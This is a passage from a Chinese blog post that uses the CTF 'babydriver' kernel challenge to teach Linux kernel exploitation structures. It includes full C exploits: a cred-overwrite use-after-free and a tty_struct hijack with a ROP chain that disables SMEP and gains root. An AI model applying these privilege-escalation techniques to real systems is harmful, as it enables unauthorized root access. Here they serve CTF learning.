<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="以一道简单的babydriver题目为基础，针对其尝试不同的利用方法。目的是为了熟悉内核pwn常用的几个结构体。">
<meta property="og:type" content="article">
<meta property="og:title" content="一个题掌握linux内核pwn常用结构体">
<meta property="og:url" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/index.html">
<meta property="og:site_name" content="blingbling&#39;s blog">
<meta property="og:description" content="以一道简单的babydriver题目为基础，针对其尝试不同的利用方法。目的是为了熟悉内核pwn常用的几个结构体。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20230110002608490.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20230102174602057.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20230102175243655.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20230102183947631.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20221231182402133.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20221231182738559.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20221231185654243.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20221231175833470.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20221231174850423.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20230102234711716.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20230102235352192.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20230108001336271.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20230108002655194.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20230108170122639.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20230108170731053.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20230108181608984.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20230110173245460.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20230110175125429.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20230109000638136.png?size=600">
<meta property="article:published_time" content="2023-01-10T13:37:19.000Z">
<meta property="article:modified_time" content="2023-01-10T15:02:17.411Z">
<meta property="article:author" content="blingbling">
<meta property="article:tag" content="kernel pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/image-20230110002608490.png?size=600"><title>一个题掌握linux内核pwn常用结构体 | blingbling's blog</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":3},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"simple","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: undefined,
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">关于</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">blingbling's blog</div><div class="header-banner-info__subtitle">Clang鱼塘</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">一个题掌握linux内核pwn常用结构体</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-01-10</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-01-10</span></span></div></header><div class="post-body"><p>本文中使用到的结构体汇总如下：</p>
<div class="table-container"><table>
<thead>
<tr>
<th align="left">结构体/能力</th>
<th align="center">控制流劫持</th>
<th align="center">泄露堆</th>
<th align="center">泄露栈</th>
<th align="center">泄露内核地址</th>
<th align="center">结构体大小</th>
</tr>
</thead>
<tbody><tr>
<td align="left">cred</td>
<td align="center">×</td>
<td align="center">√</td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">0xa8 (kmalloc-192)</td>
</tr>
<tr>
<td align="left">tty_struct</td>
<td align="center">√</td>
<td align="center">√</td>
<td align="center">×</td>
<td align="center">√</td>
<td align="center">0x2e0 (kmalloc-1024)</td>
</tr>
<tr>
<td align="left">seq_operations</td>
<td align="center">√</td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">√</td>
<td align="center">0x20 (kmalloc-32)</td>
</tr>
<tr>
<td align="left">subprocess_info</td>
<td align="center">√</td>
<td align="center">√</td>
<td align="center">×</td>
<td align="center">√</td>
<td align="center">0x60 (kmalloc-128)</td>
</tr>
<tr>
<td align="left">pipe_buffer</td>
<td align="center">√</td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">√</td>
<td align="center">0x280 (kmalloc-1024)</td>
</tr>
<tr>
<td align="left">shm_file_data</td>
<td align="center">×</td>
<td align="center">√</td>
<td align="center">×</td>
<td align="center">√</td>
<td align="center">0x20 (kmalloc-32)</td>
</tr>
<tr>
<td align="left">msg_msg</td>
<td align="center">×</td>
<td align="center">√</td>
<td align="center">×</td>
<td align="center">√</td>
<td align="center">0x31~0x1000 (&gt;= kmalloc-64)</td>
</tr>
<tr>
<td align="left">timerfd_ctx</td>
<td align="center">×</td>
<td align="center">√</td>
<td align="center">×</td>
<td align="center">√</td>
<td align="center">0xf0 (kmalloc-256)</td>
</tr>
</tbody></table></div>
<p>除此之外，还介绍了如何利用modprobe_path为程序提权。</p>

        <h1 id="环境准备"   >
          <a href="#环境准备" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1>
      <p>本文中使用的linux内核版本为4.4.72，挺老的一个版本。为什么使用这个版本呢？首先是因为ctfwiki中第一道内核pwn例题是这个版本，做题时我编了该版本内核。另一个原因是，这个版本的内核防护开的不多，对于仅仅想初步了解内核漏洞利用的常见结构体和方法来说，能省去很多麻烦。因此，本文的部分方法在新版本内核上并不适用。</p>
<p>为了方便复现本文，我将用到的文件都附在这里（也可以根据<a href="https://blingblingxuanxuan.github.io/2022/12/25/22-12-15-ways-to-debug-linuxkernel/">上一篇文章</a>自己编环境）。</p>
<ol>
<li><p><a href="./babydriver-env.zip">babydriver-env.zip</a> ：运行题目所需的环境</p>
</li>
<li><p><a href="./vmlinux.zip">vmlinux.zip</a> ：调试时需要用到</p>
</li>
<li><p><a href="./babydriver-src.zip">babydriver-src.zip</a>：babydriver的源码及Makefile。根据<a href="https://blingblingxuanxuan.github.io/2022/08/28/CISCN2017-babydriver/">这道题目</a>中babydriver.ko的反汇编结果，仿写了babydriver.ko的源码。并对write函数做了修改，以适应<code>subprocess_info</code>的利用。因此，本文不再赘述漏洞分析部分，所有小节直接给出exp源码。</p>
</li>
</ol>

        <h1 id="cred"   >
          <a href="#cred" class="heading-link"><i class="fas fa-link"></i></a><a href="#cred" class="headerlink" title="cred"></a>cred</h1>
      
        <h2 id="利用能力"   >
          <a href="#利用能力" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用能力" class="headerlink" title="利用能力"></a>利用能力</h2>
      <p>当创建一个新进程时，内核会为其申请一个 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118" >struct cred</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 结构体，用于存放进程信息。以fork创建子进程为例，内核中处理过程如下图所示</p>
<p><img   src="image-20230110002608490.png?size=600" style="width: 600px;"  alt="image-20230110002608490"></p>
<p>内核在 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/kernel/cred.c#L243" >prepare_creds()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 函数中通过<code>kmem_cache_alloc()</code>为 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118" >struct cred</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 结构体申请一段内存空间（0xa8字节大小，对应kmalloc-0xc0）。</p>
<p>cred结构体并不能用于控制流劫持，用作信息泄露的话，某些成员也许能泄露出堆地址，仅此而已。</p>
<p>但是，cred结构保存着fork子进程的权限信息，最常用的做法就是把uid/gid/suid/sgid等全部改成0，使得该子进程拥有root权限。</p>
<p>不过，新版本内核改变了cred的分配方式，正常UAF无法拿到这个结构体。</p>

        <h2 id="babydriver利用示例"   >
          <a href="#babydriver利用示例" class="heading-link"><i class="fas fa-link"></i></a><a href="#babydriver利用示例" class="headerlink" title="babydriver利用示例"></a>babydriver利用示例</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">	<span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);			</span><br><span class="line"></span><br><span class="line">	ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0xa8</span>);					</span><br><span class="line">	close(fd1);												</span><br><span class="line"></span><br><span class="line">	<span class="keyword">pid_t</span> fpid; </span><br><span class="line">	fpid=fork(); 							</span><br><span class="line">	<span class="keyword">if</span> (fpid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;error in fork!\n&quot;</span>); </span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (fpid == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;child pid is : %d\n&quot;</span>,getpid());</span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2,zeros,<span class="number">28</span>);				</span><br><span class="line">	    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">		    system(<span class="string">&quot;/bin/sh&quot;</span>);					</span><br><span class="line">		    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		wait(<span class="literal">NULL</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;parent pid is: %d\n&quot;</span>,getpid());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d: going to close fd2\n&quot;</span>,getpid());</span><br><span class="line">	close(fd2);					</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h1 id="tty-struct"   >
          <a href="#tty-struct" class="heading-link"><i class="fas fa-link"></i></a><a href="#tty-struct" class="headerlink" title="tty_struct"></a>tty_struct</h1>
      
        <h2 id="利用能力-1"   >
          <a href="#利用能力-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用能力-1" class="headerlink" title="利用能力"></a>利用能力</h2>
      
        <h3 id="控制流劫持"   >
          <a href="#控制流劫持" class="heading-link"><i class="fas fa-link"></i></a><a href="#控制流劫持" class="headerlink" title="控制流劫持"></a>控制流劫持</h3>
      <p>当用户态执行<code>open(&quot;dev/ptmx&quot;,2);</code> 或者<code>open(&quot;/dev/ptmx&quot;, O_RDWR | O_NOCTTY)</code>后，内核中的处理过程如下图所示</p>
<p><img   src="image-20230102174602057.png?size=600" style="width: 600px;"  alt="image-20230102174602057"></p>
<p>内核在 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/drivers/tty/tty_io.c#L3136" >alloc_tty_struct()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 函数中为 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/tty.h#L259" >tty_struct</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 结构体申请一段内存空间（0x2e0字节大小）。</p>
<p><img   src="image-20230102175243655.png?size=600" style="width: 600px;"  alt="image-20230102175243655"></p>
<p><code>open()</code>操作后，用户态获得一个文件描述符fd。用户态可对该fd进行 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/tty_driver.h#L251" >tty_operations</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 中包含的所有操作，如write\ioctl等。</p>
<p>如果利用漏洞改掉tty_struct中ops指向的函数表，就能实现控制流劫持。</p>

        <h3 id="信息泄露"   >
          <a href="#信息泄露" class="heading-link"><i class="fas fa-link"></i></a><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3>
      <p><code>tty_struct</code> 结构体中包含的内容较多：</p>
<ul>
<li>泄露内核基址：tty_operations指向的函数表中有许多函数指针。偏移0x2d0处存放着一个函数指针，指向<code>do_SAK_work</code>函数。</li>
<li>泄露堆地址：tty_struct结构体中包含许多链表头节点，存储着堆地址，如下图。</li>
</ul>
<p><img   src="image-20230102183947631.png?size=600" style="width: 600px;"  alt="image-20230102183947631"></p>

        <h2 id="babydriver利用示例-1"   >
          <a href="#babydriver利用示例-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#babydriver利用示例-1" class="headerlink" title="babydriver利用示例"></a>babydriver利用示例</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="comment">// gcc test.c -static -masm=intel  -o test</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> pkc_addr = <span class="number">0xffffffff81070260</span>;</span><br><span class="line"><span class="keyword">size_t</span> cc_addr = <span class="number">0xffffffff8106fed0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = pkc_addr;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = cc_addr;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> mov_rsp_rax = <span class="number">0xffffffff818855cf</span>;    <span class="comment">// mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b</span></span><br><span class="line">    <span class="keyword">size_t</span> pop_rax = <span class="number">0xffffffff8101c216</span>;        <span class="comment">// pop rax; ret; </span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">size_t</span> rop_chain[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    rop_chain[index++] = <span class="number">0xffffffff8101c216</span>;        <span class="comment">// pop rax; ret;</span></span><br><span class="line">    rop_chain[index++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop_chain[index++] = <span class="number">0xffffffff8100f034</span>;        <span class="comment">// mov cr4,rax; pop rbp; ret </span></span><br><span class="line">    rop_chain[index++] = <span class="number">0x0</span>;</span><br><span class="line">    rop_chain[index++] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    rop_chain[index++] = <span class="number">0xffffffff81885588</span>;        <span class="comment">// swapgs; ret </span></span><br><span class="line">    rop_chain[index++] = <span class="number">0xffffffff81884177</span>;        <span class="comment">// iretq; </span></span><br><span class="line">    rop_chain[index++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    rop_chain[index++] = user_cs;</span><br><span class="line">    rop_chain[index++] = user_rflags;</span><br><span class="line">    rop_chain[index++] = user_sp;</span><br><span class="line">    rop_chain[index++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> tty_operations_fake[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">30</span>;j++)&#123;</span><br><span class="line">        tty_operations_fake[j]=mov_rsp_rax;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd_tty = open(<span class="string">&quot;dev/ptmx&quot;</span>,O_RDWR | O_NOCTTY);</span><br><span class="line">    <span class="keyword">if</span>(fd_tty &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] cannot open /dev/ptmx\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] ptmx errorno: %d\n&quot;</span>,errno);</span><br><span class="line">        <span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> tty_struct_leak[<span class="number">4</span>];</span><br><span class="line">    read(fd2,tty_struct_leak,<span class="number">32</span>);</span><br><span class="line">    </span><br><span class="line">    tty_operations_fake[<span class="number">0</span>] = pop_rax;</span><br><span class="line">    tty_operations_fake[<span class="number">1</span>] = (<span class="keyword">size_t</span>)rop_chain;</span><br><span class="line">    tty_operations_fake[<span class="number">2</span>] = mov_rsp_rax;</span><br><span class="line"></span><br><span class="line">    tty_struct_leak[<span class="number">3</span>] = (<span class="keyword">size_t</span>)tty_operations_fake;</span><br><span class="line">    write(fd2,tty_struct_leak,<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> a[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    write(fd_tty,a,<span class="number">32</span>);</span><br><span class="line">    <span class="comment">// ioctl(fd_tty,0x100,32);</span></span><br><span class="line"><span class="built_in">exit</span>:</span><br><span class="line">    close(fd2);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h2 id="遇到一个问题"   >
          <a href="#遇到一个问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#遇到一个问题" class="headerlink" title="遇到一个问题"></a>遇到一个问题</h2>
      <p>执行exp时遇到的问题：<code>can&#39;t open &#39;/dev/ptmx&#39;:  No space left on device</code>。</p>
<p>没找到跟我的问题一模一样的博主，但是找到一个博主遇到打不开这个文件的问题，试了下它的方法，竟然也可以解决我的问题。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/yongbaoii/article/details/123924737?spm=1001.2014.3001.5502" >linux kernel pwn 劫持tty结构体 打不开/dev/ptmx文件（一）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/yongbaoii/article/details/124025614?spm=1001.2014.3001.5502" >linux kernel pwn 劫持tty结构体 打不开/dev/ptmx文件（二）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>解决方法：在linux的<code>/init</code>文件中添加如下两行</p>
